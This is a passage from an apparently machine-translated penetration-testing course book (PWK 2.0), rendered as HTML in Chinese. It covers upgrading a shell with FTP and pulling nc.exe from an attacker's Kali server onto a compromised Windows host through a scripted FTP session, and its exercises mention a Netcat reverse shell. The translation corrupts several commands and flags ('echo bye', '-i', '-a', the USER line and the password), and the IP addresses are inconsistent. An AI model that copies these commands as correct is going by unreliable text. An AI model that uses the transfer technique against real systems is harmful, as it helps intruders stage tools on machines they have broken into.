<div style="position:absolute;top:45518;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">220-您是允许的 50 个用户中的第 1 个。</font></font></nobr></div>
<div style="position:absolute;top:45535;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">220-当地时间现在是 09:16。</font><font style="vertical-align: inherit;">服务器端口：21。</font></font></nobr></div>
<div style="position:absolute;top:45552;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">220-这是一个私人系统 - 没有匿名登录</font></font></nobr></div>
<div style="position:absolute;top:45568;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此服务器也欢迎 220-IPv6 连接。</font></font></nobr></div>
<div style="position:absolute;top:45585;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">220 您将在 15 分钟不活动后断开连接。</font></font></nobr></div>
<div style="position:absolute;top:45603;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">姓名 (10.11.0.4:student): </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">offsec</font></font></font></b></nobr></div>
<div style="position:absolute;top:45620;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">离场</font></font></nobr></div>
<div style="position:absolute;top:45637;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">331 用户关闭正常。</font><font style="vertical-align: inherit;">要求输入密码</font></font></nobr></div>
<div style="position:absolute;top:45653;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码：</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">offsec</font></font></font></b></nobr></div>
<div style="position:absolute;top:45687;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">230 好的。</font><font style="vertical-align: inherit;">当前目录是/</font></font></nobr></div>
<div style="position:absolute;top:45704;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">远程系统类型是 UNIX。</font></font></nobr></div>
<div style="position:absolute;top:45721;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用二进制方式传输文件。</font></font></nobr></div>
<div style="position:absolute;top:45738;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ftp&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">再见</font></font></font></b></nobr></div>
<div style="position:absolute;top:45755;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">再见</font></font></nobr></div>
<div style="position:absolute;top:45772;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">221-再见。</font><font style="vertical-align: inherit;">您上传了 0 并下载了 0 KB。</font></font></nobr></div>
<div style="position:absolute;top:45789;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">221 登出。</font></font></nobr></div>
<div style="position:absolute;top:45806;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">学生@debian:~$</font></font></nobr></div>
<div style="position:absolute;top:45826;left:270"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 470 - 在我们升级的 shell 中使用交互式程序</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:45855;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这一次，我们与 FTP 服务器的交互连接成功（清单 470），当我们</font></font></nobr></div>
<div style="position:absolute;top:45874;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">退出，我们返回到升级后的 Bash 提示符。</font><font style="vertical-align: inherit;">这种技术有效地提供了一个</font></font></nobr></div>
<div style="position:absolute;top:45893;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过传统的非交互式渠道的交互式外壳，是最受欢迎的外壳之一</font></font></nobr></div>
<div style="position:absolute;top:45913;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">升级到 Linux 上的标准非交互式 shell。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:45947;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">16.1.3.2 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:45982;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（这些练习不需要报告）</font></font></i></nobr></div>
<div style="position:absolute;top:46015;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 在你的 Kali 系统上启动 Pure-FTPd FTP 服务器，使用 FTP 客户端连接到它</font></font></nobr></div>
<div style="position:absolute;top:46034;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Debian 实验室 VM，并观察交互式提示如何工作。</font></font></nobr></div>
<div style="position:absolute;top:46062;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 尝试从 Netcat 反向 shell 登录到 FTP 服务器，看看会发生什么。</font></font></nobr></div>
<div style="position:absolute;top:46091;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 研究升级非交互式外壳的替代方法。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:46128;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">16.2 与 Windows 主机传输文件</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:46170;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在类 Unix 环境中，我们经常会发现预装了 Netcat、curl 或 wget 等工具</font></font></nobr></div>
<div style="position:absolute;top:46189;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作系统，这使得从远程机器下载文件变得相对简单。</font></font></nobr></div>
<div style="position:absolute;top:46208;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然而，在 Windows 机器上，这个过程通常并不那么简单。</font><font style="vertical-align: inherit;">在本节中，我们</font></font></nobr></div>
<div style="position:absolute;top:46228;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将探索基于 Windows 的机器上的文件传输选项。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:46262;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">16.2.1</font></font></i></nobr></div>
<div style="position:absolute;top:46262;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">非交互式 FTP 下载</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:46300;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 操作系统附带一个可用于文件传输的默认 FTP 客户端。</font><font style="vertical-align: inherit;">作为</font></font></nobr></div>
<div style="position:absolute;top:46319;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们已经看到，FTP 客户端是一个需要输入才能完成的交互式程序，因此我们需要一个</font></font></nobr></div>
<div style="position:absolute;top:46339;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 FTP 进行文件传输的创造性解决方案。</font></font></nobr></div>
<div style="position:absolute;top:46372;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">FTP</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的帮助选项（</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-h</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）有一些线索，不妨来我们的援助：</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:46507;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="40"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 40 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:46540;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:47617;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:47617;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:47617;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">481</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:46638;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\用户\offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ftp -h</font></font></font></b></nobr></div>
<div style="position:absolute;top:46672;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与运行 FTP 服务器服务的计算机之间传输文件</font></font></nobr></div>
<div style="position:absolute;top:46689;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（有时称为守护进程）。</font><font style="vertical-align: inherit;">Ftp 可以交互使用。</font></font></nobr></div>
<div style="position:absolute;top:46723;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">FTP [-v] [-d] [-i] [-n] [-g] [-s:filename] [-a] [-A] [-x:sendbuffer] [-r:recvbuffer] [</font></font></nobr></div>
<div style="position:absolute;top:46740;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-b:asyncbuffers] [-w:windowsize] [host]</font></font></nobr></div>
<div style="position:absolute;top:46773;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-v    </font></font></nobr></div>
<div style="position:absolute;top:46773;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">禁止显示远程服务器响应。</font></font></nobr></div>
<div style="position:absolute;top:46791;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-n    </font></font></nobr></div>
<div style="position:absolute;top:46791;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在初始连接时禁止自动登录。</font></font></nobr></div>
<div style="position:absolute;top:46808;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-一世    </font></font></nobr></div>
<div style="position:absolute;top:46808;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在多个文件期间关闭交互式提示</font></font></nobr></div>
<div style="position:absolute;top:46825;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">转让。</font></font></nobr></div>
<div style="position:absolute;top:46841;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-d    </font></font></nobr></div>
<div style="position:absolute;top:46841;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启用调试。</font></font></nobr></div>
<div style="position:absolute;top:46858;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-G    </font></font></nobr></div>
<div style="position:absolute;top:46858;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">禁用文件名通配（参见 GLOB 命令）。</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:46875;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-s:filename 指定包含 FTP 命令的文本文件；</font><font style="vertical-align: inherit;">这</font></font></b></nobr></div>
<div style="position:absolute;top:46892;left:255"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令将在 FTP 启动后自动运行。</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:46909;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-一种    </font></font></nobr></div>
<div style="position:absolute;top:46909;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">绑定数据连接时使用任何本地接口。</font></font></nobr></div>
<div style="position:absolute;top:46926;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-一种    </font></font></nobr></div>
<div style="position:absolute;top:46926;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以匿名身份登录。</font></font></nobr></div>
<div style="position:absolute;top:46943;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-x:send sockbuf 覆盖默认的 SO_SNDBUF 大小 8192。</font></font></nobr></div>
<div style="position:absolute;top:46960;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-r:recv sockbuf 覆盖默认的 SO_RCVBUF 大小 8192。</font></font></nobr></div>
<div style="position:absolute;top:46977;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-b:async count 覆盖默认的异步计数 3</font></font></nobr></div>
<div style="position:absolute;top:46994;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-w:windowsize 覆盖默认的传输缓冲区大小 65535。</font></font></nobr></div>
<div style="position:absolute;top:47011;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主持人    </font></font></nobr></div>
<div style="position:absolute;top:47011;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指定远程的主机名或 IP 地址</font></font></nobr></div>
<div style="position:absolute;top:47028;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要连接的主机。</font></font></nobr></div>
<div style="position:absolute;top:47062;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">笔记：</font></font></nobr></div>
<div style="position:absolute;top:47079;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- mget 和 mput 命令采用 y/n/q 表示是/否/退出。</font></font></nobr></div>
<div style="position:absolute;top:47096;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- 使用 Control-C 中止命令。</font></font></nobr></div>
<div style="position:absolute;top:47115;left:375"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 471 - FTP 帮助显示</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:47144;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ftp </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-s</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项接受基于文本的命令列表，有效地使客户端非</font></font></nobr></div>
<div style="position:absolute;top:47164;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">交互的。</font><font style="vertical-align: inherit;">在我们的攻击机器上，我们将设置一个 FTP 服务器，我们将启动下载</font></font></nobr></div>
<div style="position:absolute;top:47183;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从受感染的 Windows 主机请求 Netcat 二进制文件。</font></font></nobr></div>
<div style="position:absolute;top:47216;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，我们将 nc.exe 的副本放在我们的 /ftphome 目录中：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:47251;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo cp /usr/share/windows-resources/binaries/nc.exe /ftphome/</font></font></font></b></nobr></div>
<div style="position:absolute;top:47268;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls /ftphome/</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:47285;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行程序</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:47304;left:300"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 472 - 确保 nc.exe 在 ftphome 目录中</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:47334;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们已经在 Kali 机器上安装并配置了 Pure-FTPd，但我们将重新启动它以</font></font></nobr></div>
<div style="position:absolute;top:47353;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">确保服务可用：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:47388;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo systemctl restart pure-ftpd</font></font></font></b></nobr></div>
<div style="position:absolute;top:47407;left:342"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 473 - 在 Kali 中重启 Pure-FTPd</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:47437;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们将构建一个我们希望执行的 FTP 命令的文本文件，使用 echo 命令作为</font></font></nobr></div>
<div style="position:absolute;top:47456;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如清单 474 所示。</font></font></nobr></div>
<div style="position:absolute;top:47489;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令文件以</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">open</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">开始，该</font><font style="vertical-align: inherit;">命令启动到</font></font></nobr></div>
<div style="position:absolute;top:47508;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指定的 IP 地址。</font><font style="vertical-align: inherit;">接下来，脚本将</font><font style="vertical-align: inherit;">使用</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">USER</font></font></b><font style="vertical-align: inherit;">命令并提供</font></font><b><font color="#c00000" style="font-size:11px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">offsec</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进行</font><font style="vertical-align: inherit;">身份验证</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:47528;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码，</font></font><b><font color="#c00000" style="font-size:11px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实验室</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">此时，我们应该有一个成功通过身份验证的 FTP 连接，并且</font></font></nobr></div>
<div style="position:absolute;top:47547;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以编写传输文件所需的命令。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:47695;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="41"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 41 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:47728;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:48805;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:48805;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:48805;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">482</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:47824;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">bin</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请求二进制文件传输</font><font style="vertical-align: inherit;">并发出</font><font style="vertical-align: inherit;">nc.exe</font><font style="vertical-align: inherit;">的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">GET</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请求。</font><font style="vertical-align: inherit;">最后，我们将</font></font></nobr></div>
<div style="position:absolute;top:47843;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">bye</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">关闭连接</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:47878;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo open 10.11.0.4 21&gt; ftp.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:47895;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo USER offsec&gt;&gt; ftp.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:47912;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo lab&gt;&gt; ftp.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:47929;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo bin &gt;&gt; ftp.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:47946;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo GET nc.exe &gt;&gt; ftp.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:47963;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\offsec&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">回声再见 &gt;&gt; ftp.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:47982;left:312"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 474 - 创建非交互式 FTP 脚本</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:48012;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们现在准备使用命令列表启动 FTP 会话，这将有效地使</font></font></nobr></div>
<div style="position:absolute;top:48031;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">交互式会话非交互式。</font><font style="vertical-align: inherit;">为此，我们将发出以下 FTP 命令：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:48066;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ftp -v -n -s:ftp.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:48085;left:344"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 475 - 以非交互方式使用 FTP</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:48115;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在上面的清单中，我们使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-v</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来抑制任何返回的输出，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-n</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来抑制自动登录，</font></font></nobr></div>
<div style="position:absolute;top:48134;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-s</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">表示我们的命令文件的名称。</font></font></nobr></div>
<div style="position:absolute;top:48167;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当清单 475 中的 ftp 命令运行时，我们的下载应该已经执行，并且一个工作</font></font></nobr></div>
<div style="position:absolute;top:48186;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nc.exe 的副本应该出现在我们当前的目录中：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:48221;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ftp -v -n -s:ftp.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:48238;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ftp&gt; 打开 192.168.1.31 21</font></font></nobr></div>
<div style="position:absolute;top:48255;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ftp&gt; 用户关闭</font></font></nobr></div>
<div style="position:absolute;top:48289;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ftp&gt; bin</font></font></nobr></div>
<div style="position:absolute;top:48306;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ftp&gt; 获取 nc.exe</font></font></nobr></div>
<div style="position:absolute;top:48323;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ftp&gt; 再见</font></font></nobr></div>
<div style="position:absolute;top:48357;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nc.exe -h</font></font></font></b></nobr></div>
<div style="position:absolute;top:48374;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[v1.10 NT]</font></font></nobr></div>
<div style="position:absolute;top:48391;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接到某处：nc [-options] 主机名 port[s] [ports] ...</font></font></nobr></div>
<div style="position:absolute;top:48408;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">监听入站：nc -l -p port [options] [hostname] [port]</font></font></nobr></div>
<div style="position:absolute;top:48425;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项：</font></font></nobr></div>
<div style="position:absolute;top:48442;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-d    </font></font></nobr></div>
<div style="position:absolute;top:48442;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从控制台分离，隐身模式</font></font></nobr></div>
<div style="position:absolute;top:48476;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-e 编    </font></font></nobr></div>
<div style="position:absolute;top:48476;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要执行的入站程序 [危险！！]</font></font></nobr></div>
<div style="position:absolute;top:48493;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-g 网关源路由跳点[s]，最多 8 个</font></font></nobr></div>
<div style="position:absolute;top:48510;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-G 编号    </font></font></nobr></div>
<div style="position:absolute;top:48510;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">源路由指针：4, 8, 12, ...</font></font></nobr></div>
<div style="position:absolute;top:48527;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-H    </font></font></nobr></div>
